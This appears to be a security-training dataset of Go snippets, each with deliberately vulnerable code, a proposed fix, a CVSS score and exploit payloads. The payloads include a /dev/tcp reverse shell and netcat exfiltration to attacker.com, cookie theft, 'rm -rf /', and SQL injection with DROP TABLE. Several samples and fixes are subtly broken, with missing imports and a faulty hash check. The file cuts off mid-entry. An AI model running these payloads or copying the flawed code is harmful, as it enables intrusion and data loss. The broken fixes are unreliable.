{
    "go_0": {
        "vulnerability_type": "Path Traversal",
        "vulnerability_code": "package main\n\nimport (\n    \"fmt\"\n    \"net/http\"\n    \"os\"\n    \"path/filepath\"\n)\n\nfunc handler(w http.ResponseWriter, r *http.Request) {\n    file := r.URL.Query().Get(\"file\")\n    if file == \"\" {\n        http.Error(w, \"No file specified\", http.StatusBadRequest)\n        return\n    }\n    fullPath := filepath.Join(\"/var/www/data\", file)\n    f, err := os.Open(fullPath)\n    if err != nil {\n        http.Error(w, \"File not found\", http.StatusNotFound)\n        return\n    }\n    defer f.Close()\n    _, err = io.Copy(w, f)\n    if err != nil {\n        http.Error(w, \"Failed to read file\", http.StatusInternalServerError)\n    }\n}\n\nfunc main() {\n    http.HandleFunc(\"/getfile\", handler)\n    fmt.Println(\"Server started at :8080\")\n    http.ListenAndServe(\":8080\", nil)\n}",
        "cvss_score": 7.5,
        "fixed_code": "package main\n\nimport (\n    \"fmt\"\n    \"net/http\"\n    \"os\"\n    \"path/filepath\"\n    \"strings\"\n)\n\nfunc handler(w http.ResponseWriter, r *http.Request) {\n    file := r.URL.Query().Get(\"file\")\n    if file == \"\" {\n        http.Error(w, \"No file specified\", http.StatusBadRequest)\n        return\n    }\n    baseDir := \"/var/www/data\"\n    fullPath := filepath.Join(baseDir, file)\n    cleanPath := filepath.Clean(fullPath)\n    if !strings.HasPrefix(cleanPath, baseDir) {\n        http.Error(w, \"Invalid file path\", http.StatusBadRequest)\n        return\n    }\n    f, err := os.Open(cleanPath)\n    if err != nil {\n        http.Error(w, \"File not found\", http.StatusNotFound)\n        return\n    }\n    defer f.Close()\n    _, err = io.Copy(w, f)\n    if err != nil {\n        http.Error(w, \"Failed to read file\", http.StatusInternalServerError)\n    }\n}\n\nfunc main() {\n    http.HandleFunc(\"/getfile\", handler)\n    fmt.Println(\"Server started at :8080\")\n    http.ListenAndServe(\":8080\", nil)\n}",
        "exploit_ways": [
            "An attacker can request /getfile?file=../etc/passwd to read the system's password file.",
            "They might try /getfile?file=%2e%2e/%2e%2e/%2fetc/shadow to access shadow files for more sensitive information.",
            "By using a null byte like /getfile?file=somefile%00.txt, an attacker could potentially bypass file extension checks."
        ]
    },
    "go_1": {
        "vulnerability_type": "Broken Authentication",
        "vulnerability_code": "package main\n\ntype AuthManager struct {\n    users map[string]string\n}\n\nfunc NewAuthManager() *AuthManager {\n    return &AuthManager{\n        users: make(map[string]string),\n    }\n}\n\nfunc (am *AuthManager) RegisterUser(username, password string) {\n    am.users[username] = password\n}\n\nfunc (am *AuthManager) Authenticate(username, password string) bool {\n    storedPassword, exists := am.users[username]\n    if !exists {\n        return false\n    }\n    // Very hard to detect: using a simple comparison instead of secure hash compare\n    for i := range password {\n        if i >= len(storedPassword) || password[i] != storedPassword[i] {\n            return false\n        }\n    }\n    return true\n}",
        "cvss_score": 7.5,
        "fixed_code": "package main\n\nimport (\n    \"crypto/rand\"\n    \"crypto/sha256\"\n    \"encoding/hex\"\n    \"golang.org/x/crypto/pbkdf2\"\n)\n\ntype AuthManager struct {\n    users map[string]string\n}\n\nfunc NewAuthManager() *AuthManager {\n    return &AuthManager{\n        users: make(map[string]string),\n    }\n}\n\nfunc hashPassword(password string) string {\n    salt := make([]byte, 16)\n    _, err := rand.Read(salt)\n    if err != nil {\n        panic(err)\n    }\n    hash := pbkdf2.Key([]byte(password), salt, 4096, 32, sha256.New)\n    return hex.EncodeToString(append(salt, hash...))\n}\n\nfunc checkPassword(hash, password string) bool {\n    saltHash := []byte(hash)\n    salt := saltHash[:16]\n    storedHash := saltHash[16:]\n    newHash := pbkdf2.Key([]byte(password), salt, 4096, 32, sha256.New)\n    return hmac.Equal(storedHash, newHash)\n}\n\nfunc (am *AuthManager) RegisterUser(username, password string) {\n    hashedPassword := hashPassword(password)\n    am.users[username] = hashedPassword\n}\n\nfunc (am *AuthManager) Authenticate(username, password string) bool {\n    storedHash, exists := am.users[username]\n    if !exists {\n        return false\n    }\n    return checkPassword(storedHash, password)\n}",
        "exploit_ways": [
            "An attacker can perform a timing attack to infer the length of the correct password.",
            "If an attacker gets access to the stored passwords, they can brute force them due to lack of proper hashing and salting.",
            "In case of weak or reused passwords, the attacker could easily guess and authenticate."
        ]
    },
    "go_2": {
        "vulnerability_type": "Privilege Escalation",
        "vulnerability_code": "package main\nimport (\"os/exec\")\nfunc main() {\n    cmd := exec.Command(\"sh\", \"-c\", os.Getenv(\\\"COMMAND\\\"))\n    cmd.Run()\n}",
        "cvss_score": 8.7,
        "fixed_code": "package main\nimport (\n    \"fmt\"\n    \"os/exec\"\n)\nfunc main() {\n    allowedCommands := []string{\"ls\", \"whoami\"}\n    command := os.Getenv(\"COMMAND\")\n    var isAllowed bool\n    for _, cmd := range allowedCommands {\n        if cmd == command {\n            isAllowed = true\n            break\n        }\n    }\n    if isAllowed {\n        cmd := exec.Command(command)\n        err := cmd.Run()\n        if err != nil {\n            fmt.Println(\"Error executing command:\", err)\n        }\n    } else {\n        fmt.Println(\"Command not allowed\")\n    }\n}",
        "exploit_ways": [
            "An attacker can set the COMMAND environment variable to 'rm -rf /' to delete all files.",
            "Could use 'sudo su' to gain root privileges if executed with elevated permissions.",
            "Can chain commands like 'ls; cat /etc/passwd' to leak sensitive information."
        ]
    },
    "go_3": {
        "vulnerability_type": "Cross-Site Scripting (XSS)",
        "vulnerability_code": "package main\n\nimport (\n    \"fmt\"\n    \"net/http\"\n)\n\ntype User struct {\n    Name string\n}\n\nfunc (u *User) DisplayName(w http.ResponseWriter, r *http.Request) {\n    fmt.Fprintf(w, \"Hello, %s!\", u.Name)\n}\n\nfunc handler(w http.ResponseWriter, r *http.Request) {\n    user := &User{Name: r.URL.Query().Get(\"name\")}\n    user.DisplayName(w, r)\n}\n\nfunc main() {\n    http.HandleFunc(\"/greet\", handler)\n    http.ListenAndServe(\":8080\", nil)\n}",
        "cvss_score": 7.5,
        "fixed_code": "package main\n\nimport (\n    \"fmt\"\n    \"net/http\"\n    \"html/template\"\n)\n\ntype User struct {\n    Name string\n}\n\nfunc (u *User) DisplayName(w http.ResponseWriter, r *http.Request) {\n    tmpl := template.Must(template.New(\"greeting\").Parse(\"Hello, {{.Name}}!\"))\n    tmpl.Execute(w, u)\n}\n\nfunc handler(w http.ResponseWriter, r *http.Request) {\n    user := &User{Name: r.URL.Query().Get(\"name\")}\n    user.DisplayName(w, r)\n}\n\nfunc main() {\n    http.HandleFunc(\"/greet\", handler)\n    http.ListenAndServe(\":8080\", nil)\n}",
        "exploit_ways": [
            "An attacker can inject script tags to execute JavaScript on the victim's browser.",
            "Could use <img src=x onerror=alert('XSS')> to trigger an alert box.",
            "Inject a tracking pixel using <img src=http://attacker.com/log?cookie%3Ddocument.cookie> to steal cookies."
        ]
    },
    "go_4": {
        "vulnerability_type": "Cross-Site Request Forgery (CSRF)",
        "vulnerability_code": "package main\n\nimport (\n    \"fmt\"\n    \"net/http\"\n)\n\nfunc transferHandler(w http.ResponseWriter, r *http.Request) {\n    if r.Method == \"POST\" {\n        toAccount := r.FormValue(\"to\")\n        amount := r.FormValue(\"amount\")\n        // Simulate a bank transfer without CSRF protection\n        fmt.Fprintf(w, \"Transferred %s to account %s\", amount, toAccount)\n    }\n}\n\nfunc main() {\n    http.HandleFunc(\"/transfer\", transferHandler)\n    http.ListenAndServe(\":8080\", nil)\n}",
        "cvss_score": 6.5,
        "fixed_code": "package main\n\nimport (\n    \"fmt\"\n    \"net/http\"\n    \"crypto/rand\"\n    \"encoding/base64\"\n)\n\nvar csrfTokens = make(map[string]bool)\n\nfunc generateCSRFToken() string {\n    b := make([]byte, 32)\n    rand.Read(b)\n    token := base64.URLEncoding.EncodeToString(b)\n    csrfTokens[token] = true\n    return token\n}\n\nfunc transferHandler(w http.ResponseWriter, r *http.Request) {\n    if r.Method == \"POST\" {\n        token := r.FormValue(\"csrf_token\")\n        if !csrfTokens[token] {\n            fmt.Fprintf(w, \"Invalid CSRF Token\")\n            return\n        }\n        delete(csrfTokens, token)\n        toAccount := r.FormValue(\"to\")\n        amount := r.FormValue(\"amount\")\n        // Simulate a bank transfer with CSRF protection\n        fmt.Fprintf(w, \"Transferred %s to account %s\", amount, toAccount)\n    }\n}\n\nfunc main() {\n    http.HandleFunc(\"/transfer\", transferHandler)\n    http.ListenAndServe(\":8080\", nil)\n}",
        "exploit_ways": [
            "An attacker can trick a logged-in user into visiting a malicious website that submits a POST request to the bank's transfer endpoint, resulting in an unauthorized transaction.",
            "By embedding a form with an auto-submit script on their own site, the attacker can force the user's browser to execute the CSRF attack without user interaction beyond visiting the page.",
            "Using social engineering tactics, attackers can convince users to click a link or submit a form that includes a malicious request to the vulnerable endpoint, leading to unauthorized actions."
        ]
    },
    "go_5": {
        "vulnerability_type": "Broken Authentication",
        "vulnerability_code": "package main\n\nimport (\n    \"fmt\"\n    \"net/http\"\n)\n\ntype User struct {\n    Username string\n    Password string\n}\n\nvar users = []User{\n    {\"admin\", \"password123\"},\n}\n\nfunc loginHandler(w http.ResponseWriter, r *http.Request) {\n    username := r.FormValue(\"username\")\n    password := r.FormValue(\"password\")\n    for _, user := range users {\n        if user.Username == username && user.Password == password {\n            fmt.Fprintf(w, \"Welcome, %s!\", username)\n            return\n        }\n    }\n    http.Error(w, \"Invalid credentials\", http.StatusUnauthorized)\n}\n\nfunc main() {\n    http.HandleFunc(\"/login\", loginHandler)\n    http.ListenAndServe(\":8080\", nil)\n}",
        "cvss_score": 6.5,
        "fixed_code": "package main\n\nimport (\n    \"crypto/hmac\"\n    \"crypto/sha256\"\n    \"encoding/base64\"\n    \"fmt\"\n    \"net/http\"\n)\n\ntype User struct {\n    Username string\n    PasswordHash string\n}\n\nvar users = []User{\n    {\"admin\", hashPassword(\"password123\")},\n}\n\nfunc hashPassword(password string) string {\n    h := hmac.New(sha256.New, []byte(\"secretkey\"))\n    h.Write([]byte(password))\n    return base64.StdEncoding.EncodeToString(h.Sum(nil))\n}\n\nfunc checkPasswordHash(password, hash string) bool {\n    h := hmac.New(sha256.New, []byte(\"secretkey\"))\n    h.Write([]byte(password))\n    newHash := base64.StdEncoding.EncodeToString(h.Sum(nil))\n    return hmac.Equal([]byte(newHash), []byte(hash))\n}\n\nfunc loginHandler(w http.ResponseWriter, r *http.Request) {\n    username := r.FormValue(\"username\")\n    password := r.FormValue(\"password\")\n    for _, user := range users {\n        if user.Username == username && checkPasswordHash(password, user.PasswordHash) {\n            fmt.Fprintf(w, \"Welcome, %s!\", username)\n            return\n        }\n    }\n    http.Error(w, \"Invalid credentials\", http.StatusUnauthorized)\n}\n\nfunc main() {\n    http.HandleFunc(\"/login\", loginHandler)\n    http.ListenAndServe(\":8080\", nil)\n}",
        "exploit_ways": [
            "An attacker could brute-force the login to gain unauthorized access.",
            "By intercepting network traffic, an attacker might discover hardcoded credentials if not encrypted.",
            "If no rate limiting is in place, attackers can perform denial-of-service attacks by attempting numerous logins."
        ]
    },
    "go_6": {
        "vulnerability_type": "Command Injection",
        "vulnerability_code": "package main\n\nimport (\n    \"fmt\"\n    \"os/exec\"\n)\n\nfunc main() {\n    var cmd string\n    fmt.Print(\"Enter command to execute: \")\n    fmt.Scanln(&cmd)\n    output, err := exec.Command(\"/bin/sh\", \"-c\", cmd).Output()\n    if err != nil {\n        fmt.Printf(\"Error executing command: %v\\n\", err)\n    }\n    fmt.Printf(\"Command Output: %s\\n\", string(output))\n}",
        "cvss_score": 8.2,
        "fixed_code": "package main\n\nimport (\n    \"fmt\"\n    \"os/exec\"\n)\n\nfunc main() {\n    var cmd string\n    fmt.Print(\"Enter command to execute: \")\n    fmt.Scanln(&cmd)\n    allowedCommands := map[string]bool{\n        \"ls\":   true,\n        \"whoami\": true,\n    }\n    if !allowedCommands[cmd] {\n        fmt.Println(\"Command not allowed\")\n        return\n    }\n    output, err := exec.Command(cmd).Output()\n    if err != nil {\n        fmt.Printf(\"Error executing command: %v\\n\", err)\n    }\n    fmt.Printf(\"Command Output: %s\\n\", string(output))\n}",
        "exploit_ways": [
            "User could input 'rm -rf /' to delete system files.",
            "Could use '; cat /etc/passwd' to leak sensitive files."
        ]
    },
    "go_7": {
        "vulnerability_type": "Insecure Deserialization",
        "vulnerability_code": "package main\n\nimport (\n    \"encoding/gob\"\n    \"bytes\"\n)\n\ntype User struct {\n    Name string\n    Admin bool\n}\n\nfunc deserializeUser(data []byte) *User {\n    buf := bytes.NewBuffer(data)\n    dec := gob.NewDecoder(buf)\n    var user User\n    if err := dec.Decode(&user); err != nil {\n        panic(err)\n    }\n    return &user\n}\n\nfunc main() {\n    // Simulate receiving data from an untrusted source\n    maliciousData := []byte{0x82, 0x4f, 0x76, 0x19, 0x3, 0x55, 0xa5, 0x10, 0xb, 0x9b, 0xe, 0xd0, 0x12, 0xc8, 0x4a, 0xf6}\n    user := deserializeUser(maliciousData)\n    if user.Admin {\n        println(\"Admin access granted\")\n    }\n}",
        "cvss_score": 7.5,
        "fixed_code": "package main\n\nimport (\n    \"encoding/json\"\n    \"bytes\"\n)\n\ntype User struct {\n    Name string `json:\"name\"`\n    Admin bool `json:\"admin\"`\n}\n\nfunc deserializeUser(data []byte) *User {\n    var user User\n    if err := json.Unmarshal(data, &user); err != nil {\n        panic(err)\n    }\n    return &user\n}\n\nfunc main() {\n    // Simulate receiving data from an untrusted source\n    maliciousData := []byte(`{\"name\":\"attacker\",\"admin\":false}`)\n    user := deserializeUser(maliciousData)\n    if user.Admin {\n        println(\"Admin access granted\")\n    }\n}",
        "exploit_ways": [
            "An attacker can craft a payload to set the Admin field to true, granting unauthorized admin privileges.",
            "By sending a maliciously crafted Gob serialized object, an attacker could execute arbitrary code if the deserialization process is not properly secured.",
            "An attacker might inject additional data fields that the application does not expect, potentially leading to unexpected behavior or vulnerabilities."
        ]
    },
    "go_8": {
        "vulnerability_type": "Path Traversal",
        "vulnerability_code": "package main\n\nimport (\n    \"fmt\"\n    \"net/http\"\n    \"os\"\n    \"path/filepath\"\n)\n\nfunc serveFile(w http.ResponseWriter, r *http.Request) {\n    fileName := r.URL.Path[1:]\n    if len(fileName) == 0 {\n        http.NotFound(w, r)\n        return\n    }\n    fullPath := filepath.Join(\"/safe/directory\", filepath.Base(fileName))\n    file, err := os.Open(fullPath)\n    if err != nil {\n        http.Error(w, \"File not found.\", 404)\n        return\n    }\n    defer file.Close()\n    _, err = io.Copy(w, file)\n    if err != nil {\n        http.Error(w, \"Failed to read the file.\", 500)\n    }\n}\n\nfunc main() {\n    http.HandleFunc(\"/files/\", serveFile)\n    fmt.Println(http.ListenAndServe(\":8080\", nil))\n}",
        "cvss_score": 6.1,
        "fixed_code": "package main\n\nimport (\n    \"fmt\"\n    \"net/http\"\n    \"os\"\n    \"path/filepath\"\n)\n\nfunc serveFile(w http.ResponseWriter, r *http.Request) {\n    fileName := r.URL.Path[len(\"/files/\"):] // Extract the filename from URL path\n    if len(fileName) == 0 {\n        http.NotFound(w, r)\n        return\n    }\n    // Sanitize and ensure it's within the safe directory\n    fullPath := filepath.Join(\"/safe/directory\", fileName)\n    realPath, err := filepath.EvalSymlinks(fullPath)\n    if err != nil || !strings.HasPrefix(realPath, \"/safe/directory\") {\n        http.Error(w, \"File not found.\", 404)\n        return\n    }\n    file, err := os.Open(realPath)\n    if err != nil {\n        http.Error(w, \"File not found.\", 404)\n        return\n    }\n    defer file.Close()\n    _, err = io.Copy(w, file)\n    if err != nil {\n        http.Error(w, \"Failed to read the file.\", 500)\n    }\n}\n\nfunc main() {\n    http.HandleFunc(\"/files/\", serveFile)\n    fmt.Println(http.ListenAndServe(\":8080\", nil))\n}",
        "exploit_ways": [
            "An attacker can input a path like \"../../../../etc/passwd\" to read sensitive files.",
            "Using symbolic links, an attacker might access files outside the intended directory.",
            "Crafting requests with encoded characters could bypass basic sanitization attempts."
        ]
    },
    "go_9": {
        "vulnerability_type": "Command Injection",
        "vulnerability_code": "package main\n\nimport (\n    \"bufio\"\n    \"fmt\"\n    \"os/exec\"\n    \"strings\"\n)\n\nfunc main() {\n    var userInput string\n    fmt.Println(\"Enter a command to execute:\")\n    scanner := bufio.NewScanner(os.Stdin)\n    if scanner.Scan() {\n        userInput = scanner.Text()\n        parts := strings.Fields(userInput)\n        cmd := exec.Command(parts[0], parts[1:]...)\n        output, err := cmd.CombinedOutput()\n        if err != nil {\n            fmt.Printf(\"Error executing command: %s\\n\", err)\n        }\n        fmt.Printf(\"Command Output:\\n%s\\n\", string(output))\n    }\n}",
        "cvss_score": 8.5,
        "fixed_code": "package main\n\nimport (\n    \"bufio\"\n    \"fmt\"\n    \"log\"\n    \"os/exec\"\n)\n\nfunc main() {\n    var userInput string\n    fmt.Println(\"Enter a command to execute (only 'ls' and 'whoami' are allowed):\")\n    scanner := bufio.NewScanner(os.Stdin)\n    if scanner.Scan() {\n        userInput = scanner.Text()\n        args := []string{userInput}\n        var cmd *exec.Cmd\n        switch userInput {\n        case \"ls\":\n            cmd = exec.Command(\"ls\")\n        case \"whoami\":\n            cmd = exec.Command(\"whoami\")\n        default:\n            fmt.Println(\"Command not allowed\")\n            return\n        }\n        output, err := cmd.CombinedOutput()\n        if err != nil {\n            log.Fatalf(\"Error executing command: %s\\n\", err)\n        }\n        fmt.Printf(\"Command Output:\\n%s\\n\", string(output))\n    }\n}",
        "exploit_ways": [
            "User could input 'ls; rm -rf /' to delete system files after listing directory contents.",
            "Could use 'whoami && cat /etc/passwd' to leak sensitive information after verifying user identity.",
            "Input like 'ls | nc attacker.com 12345' can exfiltrate directory listings to a remote server."
        ]
    },
    "go_10": {
        "vulnerability_type": "Cross-Site Scripting (XSS)",
        "vulnerability_code": "package main\n\nimport (\n\t\"fmt\"\n\t\"net/http\"\n)\n\nfunc vulnerableHandler(w http.ResponseWriter, r *http.Request) {\n\tname := r.URL.Query().Get(\"name\")\n\tfmt.Fprintf(w, \"Hello, \"+name+\"!\")\n}\n\nfunc main() {\n\thttp.HandleFunc(\"/greet\", vulnerableHandler)\n\thttp.ListenAndServe(\":8080\", nil)\n}",
        "cvss_score": 6.1,
        "fixed_code": "package main\n\nimport (\n\t\"fmt\"\n\t\"net/http\"\n\t\"html/template\"\n)\n\nfunc safeHandler(w http.ResponseWriter, r *http.Request) {\n\tname := r.URL.Query().Get(\"name\")\n\tt := template.Must(template.New(\"greeting\").Parse(\"Hello, {{.}}!\"))\n\tt.Execute(w, name)\n}\n\nfunc main() {\n\thttp.HandleFunc(\"/greet\", safeHandler)\n\thttp.ListenAndServe(\":8080\", nil)\n}",
        "exploit_ways": [
            "An attacker could inject script tags like <script>alert('XSS')</script> in the 'name' parameter to execute arbitrary JavaScript.",
            "Injecting <img src=x onerror=alert(document.cookie)> can steal cookies from users visiting the page.",
            "Crafting a payload with <svg/onload=prompt(1)> could prompt users with unwanted dialogs, affecting user experience and potentially leading to phishing attacks."
        ]
    },
    "go_11": {
        "vulnerability_type": "Broken Authentication",
        "vulnerability_code": "package main\n\nimport (\n    \"fmt\"\n    \"golang.org/x/crypto/bcrypt\"\n)\n\ntype User struct {\n    Username string\n    PasswordHash []byte\n}\n\nfunc (u *User) SetPassword(password string) error {\n    hash, err := bcrypt.GenerateFromPassword([]byte(password), bcrypt.DefaultCost)\n    if err != nil {\n        return err\n    }\n    u.PasswordHash = hash\n    return nil\n}\n\nfunc (u *User) Authenticate(password string) bool {\n    // Simulate very hard to detect mistake: always returns true\n    return true\n}\n\nfunc main() {\n    user := &User{}\n    user.SetPassword(\"securepassword\")\n    fmt.Println(user.Authenticate(\"wrongpassword\")) // This should be false, but it's true due to the bug\n}",
        "cvss_score": 8.5,
        "fixed_code": "package main\n\nimport (\n    \"fmt\"\n    \"golang.org/x/crypto/bcrypt\"\n)\n\ntype User struct {\n    Username string\n    PasswordHash []byte\n}\n\nfunc (u *User) SetPassword(password string) error {\n    hash, err := bcrypt.GenerateFromPassword([]byte(password), bcrypt.DefaultCost)\n    if err != nil {\n        return err\n    }\n    u.PasswordHash = hash\n    return nil\n}\n\nfunc (u *User) Authenticate(password string) bool {\n    err := bcrypt.CompareHashAndPassword(u.PasswordHash, []byte(password))\n    return err == nil\n}\n\nfunc main() {\n    user := &User{}\n    user.SetPassword(\"securepassword\")\n    fmt.Println(user.Authenticate(\"wrongpassword\")) // This should now correctly return false\n}",
        "exploit_ways": [
            "Attackers can log in without a valid password by exploiting the broken authentication.",
            "An attacker can perform actions requiring authentication without proper credentials.",
            "Potential for privilege escalation if authentication checks are bypassed."
        ]
    },
    "go_12": {
        "vulnerability_type": "Cross-Site Request Forgery (CSRF)",
        "vulnerability_code": "package main\n\nimport (\n    \"fmt\"\n    \"net/http\"\n)\n\ntype User struct {\n    Username string\n}\n\nfunc transferHandler(w http.ResponseWriter, r *http.Request) {\n    if r.Method == \"POST\" {\n        from := r.FormValue(\"from\")\n        to := r.FormValue(\"to\")\n        amount := r.FormValue(\"amount\")\n        fmt.Fprintf(w, \"Transferring %s from %s to %s\\n\", amount, from, to)\n    }\n}\n\nfunc main() {\n    http.HandleFunc(\"/transfer\", transferHandler)\n    http.ListenAndServe(\":8080\", nil)\n}",
        "cvss_score": 7.5,
        "fixed_code": "package main\n\nimport (\n    \"fmt\"\n    \"net/http\"\n    \"crypto/rand\"\n    \"encoding/base64\"\n    \"html/template\"\n)\n\ntype User struct {\n    Username string\n}\n\nvar csrfTokens = make(map[string]bool)\n\nfunc generateCSRFToken() string {\n    b := make([]byte, 32)\n    rand.Read(b)\n    token := base64.URLEncoding.EncodeToString(b)\n    csrfTokens[token] = true\n    return token\n}\n\nfunc transferHandler(w http.ResponseWriter, r *http.Request) {\n    if r.Method == \"POST\" {\n        token := r.FormValue(\"csrf_token\")\n        if !csrfTokens[token] {\n            fmt.Fprintf(w, \"Invalid CSRF Token\\n\")\n            return\n        }\n        delete(csrfTokens, token)\n        from := r.FormValue(\"from\")\n        to := r.FormValue(\"to\")\n        amount := r.FormValue(\"amount\")\n        fmt.Fprintf(w, \"Transferring %s from %s to %s\\n\", amount, from, to)\n    } else {\n        token := generateCSRFToken()\n        tmpl := template.Must(template.New(\"transferForm\").Parse(`<form method=\"POST\" action=\"/transfer\">\n            <input type=\"hidden\" name=\"csrf_token\" value=\"{{.}}\">\n            From: <input type=\"text\" name=\"from\"><br>\n            To: <input type=\"text\" name=\"to\"><br>\n            Amount: <input type=\"text\" name=\"amount\"><br>\n            <input type=\"submit\" value=\"Transfer\">\n        </form>`))\n        tmpl.Execute(w, token)\n    }\n}\n\nfunc main() {\n    http.HandleFunc(\"/transfer\", transferHandler)\n    http.ListenAndServe(\":8080\", nil)\n}",
        "exploit_ways": [
            "An attacker can create a malicious website that submits a form to the /transfer endpoint with predefined values, tricking a logged-in user into unknowingly transferring funds.",
            "Using JavaScript on a compromised site, an attacker can programmatically submit a POST request to the bank's transfer endpoint without the user's interaction.",
            "Crafting email links or social media posts that lead users to click and inadvertently trigger a transaction via CSRF."
        ]
    },
    "go_13": {
        "vulnerability_type": "SQL Injection",
        "vulnerability_code": "package main\n\nimport (\n    \"database/sql\"\n    \"fmt\"\n    _ \"github.com/go-sql-driver/mysql\"\n    \"net/http\"\n)\n\nfunc searchHandler(w http.ResponseWriter, r *http.Request) {\n    db, err := sql.Open(\"mysql\", \"user:password@tcp(127.0.0.1:3306)/dbname\")\n    if err != nil {\n        fmt.Fprintf(w, \"%s\", err.Error())\n        return\n    }\n    defer db.Close()\n\n    query := r.URL.Query().Get(\"query\")\n    rows, err := db.Query(fmt.Sprintf(\"SELECT * FROM users WHERE name = '%s'\", query))\n    if err != nil {\n        fmt.Fprintf(w, \"%s\", err.Error())\n        return\n    }\n    defer rows.Close()\n\n    for rows.Next() {\n        var id int\n        var name string\n        if err := rows.Scan(&id, &name); err != nil {\n            fmt.Fprintf(w, \"%s\", err.Error())\n            return\n        }\n        fmt.Fprintf(w, \"User: %d, Name: %s\\n\", id, name)\n    }\n}\n\nfunc main() {\n    http.HandleFunc(\"/search\", searchHandler)\n    fmt.Println(http.ListenAndServe(\":8080\", nil))\n}",
        "cvss_score": 7.5,
        "fixed_code": "package main\n\nimport (\n    \"database/sql\"\n    \"fmt\"\n    _ \"github.com/go-sql-driver/mysql\"\n    \"net/http\"\n)\n\nfunc searchHandler(w http.ResponseWriter, r *http.Request) {\n    db, err := sql.Open(\"mysql\", \"user:password@tcp(127.0.0.1:3306)/dbname\")\n    if err != nil {\n        fmt.Fprintf(w, \"%s\", err.Error())\n        return\n    }\n    defer db.Close()\n\n    query := r.URL.Query().Get(\"query\")\n    rows, err := db.Query(\"SELECT * FROM users WHERE name = ?\", query)\n    if err != nil {\n        fmt.Fprintf(w, \"%s\", err.Error())\n        return\n    }\n    defer rows.Close()\n\n    for rows.Next() {\n        var id int\n        var name string\n        if err := rows.Scan(&id, &name); err != nil {\n            fmt.Fprintf(w, \"%s\", err.Error())\n            return\n        }\n        fmt.Fprintf(w, \"User: %d, Name: %s\\n\", id, name)\n    }\n}\n\nfunc main() {\n    http.HandleFunc(\"/search\", searchHandler)\n    fmt.Println(http.ListenAndServe(\":8080\", nil))\n}",
        "exploit_ways": [
            "An attacker can input 'admin' OR '1'='1' to retrieve all users.",
            "They can use a UNION SELECT statement to extract data from other tables, e.g., 'a' UNION SELECT username, password FROM admin--'",
            "Input like \"admin'; DROP TABLE users; --\" could drop the users table."
        ]
    },
    "go_14": {
        "vulnerability_type": "Broken Authentication",
        "vulnerability_code": "package main\n\nimport (\n    \"fmt\"\n    \"golang.org/x/crypto/bcrypt\"\n)\n\ntype User struct {\n    Username string\n    PasswordHash []byte\n}\n\nvar users = map[string]User{\n    \"admin\": {Username: \"admin\", PasswordHash: []byte(\"$2a$10$vI8aWBnW3fID.ZQ4/zo1G.q1lRps.9cGLcZEiGDMVr5yUP1KUOYTa\")},\n}\n\nfunc authenticate(username, password string) bool {\n    user, exists := users[username]\n    if !exists {\n        return false\n    }\n    err := bcrypt.CompareHashAndPassword(user.PasswordHash, []byte(password))\n    return err == nil\n}\n\nfunc main() {\n    fmt.Println(authenticate(\"admin\", \"correcthorsebatterystaple\"))\n}",
        "cvss_score": 6.5,
        "fixed_code": "package main\n\nimport (\n    \"fmt\"\n    \"golang.org/x/crypto/bcrypt\"\n)\n\ntype User struct {\n    Username string\n    PasswordHash []byte\n}\n\nvar users = map[string]User{\n    \"admin\": {Username: \"admin\", PasswordHash: []byte(\"$2a$10$vI8aWBnW3fID.ZQ4/zo1G.q1lRps.9cGLcZEiGDMVr5yUP1KUOYTa\")},\n}\n\nfunc authenticate(username, password string) bool {\n    user, exists := users[username]\n    if !exists {\n        return false\n    }\n    err := bcrypt.CompareHashAndPassword(user.PasswordHash, []byte(password))\n    return err == nil && len(password) >= 8\n}\n\nfunc main() {\n    fmt.Println(authenticate(\"admin\", \"correcthorsebatterystaple\"))\n}",
        "exploit_ways": [
            "An attacker can use a brute force attack to guess the password due to lack of rate limiting.",
            "If an attacker gains access to the source code, they can see the hashed password and attempt to crack it offline.",
            "No account lockout after multiple failed attempts allows for continuous guessing without consequence."
        ]
    },
    "go_15": {
        "vulnerability_type": "Command Injection",
        "vulnerability_code": "package main\n\ntype Executor struct {\n}\n\nfunc (e *Executor) RunCommand(cmd string) error {\n    return exec.Command(\"sh\", \"-c\", cmd).Run()\n}",
        "cvss_score": 8.2,
        "fixed_code": "package main\n\nimport (\n    \"os/exec\"\n)\ntype Executor struct {\n}\n\nfunc (e *Executor) RunCommand(cmd string, args []string) error {\n    return exec.Command(cmd, args...).Run()\n}",
        "exploit_ways": [
            "An attacker can input 'ls; rm -rf /' to delete all files.",
            "Could use 'bash -i >& /dev/tcp/attacker.com/80 0>&1' for a reverse shell.",
            "Executing commands like 'find / -name \".*\"' can reveal hidden files."
        ]
    },
    "go_16": {
        "vulnerability_type": "SQL Injection",
        "vulnerability_code": "package main\nimport (\n    \"database/sql\"\n    \"fmt\"\n    _ \"github.com/go-sql-driver/mysql\"\n)\ntype User struct {\n    ID   int\n    Name string\n}\nfunc (u *User) GetUserByName(name string) (*User, error) {\n    db, err := sql.Open(\"mysql\", \"user:password@tcp(127.0.0.1:3306)/dbname\")\n    if err != nil {\n        return nil, err\n    }\n    defer db.Close()\n    query := fmt.Sprintf(\"SELECT id, name FROM users WHERE name = '%s'\", name)\n    row := db.QueryRow(query)\n    err = row.Scan(&u.ID, &u.Name)\n    if err != nil {\n        return nil, err\n    }\n    return u, nil\n}\nfunc main() {}",
        "cvss_score": 8.2,
        "fixed_code": "package main\nimport (\n    \"database/sql\"\n    \"fmt\"\n    _ \"github.com/go-sql-driver/mysql\"\n)\ntype User struct {\n    ID   int\n    Name string\n}\nfunc (u *User) GetUserByName(name string) (*User, error) {\n    db, err := sql.Open(\"mysql\", \"user:password@tcp(127.0.0.1:3306)/dbname\")\n    if err != nil {\n        return nil, err\n    }\n    defer db.Close()\n    query := \"SELECT id, name FROM users WHERE name = ?\"\n    row := db.QueryRow(query, name)\n    err = row.Scan(&u.ID, &u.Name)\n    if err != nil {\n        return nil, err\n    }\n    return u, nil\n}\nfunc main() {}",
        "exploit_ways": [
            "An attacker can input \"admin' OR '1'='1\" to retrieve all user details.",
            "Using a payload like \"user_name'; DROP TABLE users; --\", the attackers could drop the entire users table.",
            "By inputting \"name' UNION SELECT password FROM admin_table -- \", an attacker might extract passwords from another table."
        ]
    },
    "go_17": {
        "vulnerability_type": "Privilege Escalation",
        "vulnerability_code": "package main\n\ntype User struct {\n    Name string\n    isAdmin bool\n}\n\nfunc (u *User) makeAdmin() {\n    if u.Name == \"admin\" {\n        u.isAdmin = true\n    }\n}",
        "cvss_score": 7.5,
